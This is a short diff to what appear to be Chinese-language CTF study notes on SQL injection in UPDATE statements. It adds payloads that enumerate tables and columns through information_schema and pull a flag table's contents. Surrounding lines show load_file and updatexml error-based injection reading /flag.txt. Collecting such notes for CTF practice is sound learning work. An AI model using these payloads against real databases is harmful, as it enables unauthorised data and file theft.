@@ -51,6 +51,17 @@ update语句中，在update后面有注入，
 
 ',`address`=(select(load_file("/flag.txt")))#
 ```
+相似的
+```
+名
+password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&username=1
+名
+password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#&username=1
+字段
+password=1',username=(select flagas from flaga) where 1=1#&username=1
+```
+
+
 2、where报错注入
 ```
 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
